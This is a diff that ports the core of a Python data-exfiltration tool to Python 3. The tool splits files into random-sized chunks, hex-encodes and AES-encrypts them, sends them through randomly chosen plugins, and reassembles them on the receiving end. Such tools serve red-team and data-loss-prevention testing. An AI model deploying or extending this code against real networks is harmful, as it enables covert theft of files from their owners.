@@ -4,6 +4,7 @@ import threading
 import hashlib
 import argparse
 import sys
+import importlib.util
 import string
 import time
 import json
@@ -39,7 +40,7 @@ class bcolors:
 
 
 def display_message(message):
-    print "[%s] %s" % (time.strftime("%Y-%m-%d.%H:%M:%S", time.gmtime()), message)
+    print("[%s] %s" % (time.strftime("%Y-%m-%d.%H:%M:%S", time.gmtime()), message))
 
 
 def warning(message):
@@ -56,43 +57,39 @@ def info(message):
 
 # http://stackoverflow.com/questions/12524994/encrypt-decrypt-using-pycrypto-aes-256
 def aes_encrypt(message, key=KEY):
-    try:
-        # Generate random CBC IV
-        iv = os.urandom(AES.block_size)
+    from Crypto.Util.Padding import pad
 
-        # Derive AES key from passphrase
-        aes = AES.new(hashlib.sha256(key).digest(), AES.MODE_CBC, iv)
+    if isinstance(message, str):
+        message = message.encode("utf-8")
 
-        # Add PKCS5 padding
-        pad = lambda s: s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)
+    if isinstance(key, str):
+        key = key.encode("utf-8")
 
-        # Return data size, iv and encrypted message
-        return iv + aes.encrypt(pad(message))
-    except:
-        return None
+    iv = os.urandom(AES.block_size)
+    cipher = AES.new(hashlib.sha256(key).digest(), AES.MODE_CBC, iv)
+
+    return iv + cipher.encrypt(pad(message, AES.block_size))
+
 
 def aes_decrypt(message, key=KEY):
-    try:
-        # Retrieve CBC IV
-        iv = message[:AES.block_size]
-        message = message[AES.block_size:]
+    from Crypto.Util.Padding import unpad
 
-        # Derive AES key from passphrase
-        aes = AES.new(hashlib.sha256(key).digest(), AES.MODE_CBC, iv)
-        message = aes.decrypt(message)
+    if isinstance(key, str):
+        key = key.encode("utf-8")
 
-        # Remove PKCS5 padding
-        unpad = lambda s: s[:-ord(s[len(s) - 1:])]
+    iv = message[:AES.block_size]
+    ciphertext = message[AES.block_size:]
 
-        return unpad(message)
-    except:
-        return None
+    cipher = AES.new(hashlib.sha256(key).digest(), AES.MODE_CBC, iv)
+
+    return unpad(cipher.decrypt(ciphertext), AES.block_size)
+
 
 # Do a md5sum of the file
 def md5(fname):
     hash = hashlib.md5()
-    with open(fname) as f:
-        for chunk in iter(lambda: f.read(4096), ""):
+    with open(fname, 'rb') as f:
+        for chunk in iter(lambda: f.read(4096), b''):
             hash.update(chunk)
     return hash.hexdigest()
 
@@ -116,16 +113,30 @@ class Exfiltration(object):
         self.results = results
         self.target = "127.0.0.1"
 
-        path = "plugins/"
+
+        # Load plugins without interfering with Python's standard libraries
+        path = os.path.join(os.path.dirname(__file__), "plugins")
         plugins = {}
 
-        # Load plugins
-        sys.path.insert(0, path)
         for f in os.listdir(path):
             fname, ext = os.path.splitext(f)
-            if ext == '.py' and self.should_use_plugin(fname):
-                mod = __import__(fname)
-                plugins[fname] = mod.Plugin(self, config["plugins"][fname])
+
+            if ext == ".py" and self.should_use_plugin(fname):
+                plugin_path = os.path.join(path, f)
+                module_name = "det_plugin_" + fname
+
+                spec = importlib.util.spec_from_file_location(
+                    module_name, plugin_path
+                )
+
+                mod = importlib.util.module_from_spec(spec)
+                sys.modules[module_name] = mod
+                spec.loader.exec_module(mod)
+
+                plugins[fname] = mod.Plugin(
+                    self, config["plugins"][fname]
+                )
+
 
     def should_use_plugin(self, plugin_name):
         # if the plugin has been specified specifically (-p twitter)
@@ -154,7 +165,7 @@ class Exfiltration(object):
             function_mapping[mode](message)
 
     def get_random_plugin(self):
-        plugin_name = random.sample(self.plugins, 1)[0]
+        plugin_name = random.choice(list(self.plugins))
         return plugin_name, self.plugins[plugin_name]['send']
 
     def use_plugin(self, plugins):
@@ -189,11 +200,11 @@ class Exfiltration(object):
         fname = files[jobid]['filename']
         filename = "%s.%s" % (fname.replace(
             os.path.pathsep, ''), time.strftime("%Y-%m-%d.%H:%M:%S", time.gmtime()))
-        content = ''.join(str(v) for v in files[jobid]['data']).decode('hex')
+        content = bytes.fromhex(''.join(str(v) for v in files[jobid]['data']))
         content = aes_decrypt(content, self.KEY)
         if COMPRESSION:
             content = decompress(content)
-        f = open(filename, 'w')
+        f = open(filename, 'wb')
         f.write(content)
         f.close()
         if (files[jobid]['checksum'] == md5(filename)):
@@ -205,7 +216,7 @@ class Exfiltration(object):
     def retrieve_data(self, data):
         global files
         try:
-            message = data
+            message = data.decode('utf-8') if isinstance(data, bytes) else data
             if (message.count("|!|") >= 2):
                 info("Received {0} bytes".format(len(message)))
                 message = message.split("|!|")
@@ -265,7 +276,7 @@ class ExfiltrateFile(threading.Thread):
 
         packet_index = 0
         while (True):
-            data_file = f.read(randint(MIN_BYTES_READ, MAX_BYTES_READ)).encode('hex')
+            data_file = f.read(randint(MIN_BYTES_READ, MAX_BYTES_READ)).hex()
             if not data_file:
                 break
             plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
@@ -316,7 +327,7 @@ def main():
     results = parser.parse_args()
 
     if (results.config is None):
-        print "Specify a configuration file!"
+        print("Specify a configuration file!")
         parser.print_help()
         sys.exit(-1)
 
@@ -369,7 +380,7 @@ def main():
     for thread in threads:
         while True:
             thread.join(1)
-            if not thread.isAlive():
+            if not thread.is_alive():
                 break
 
 if __name__ == '__main__':
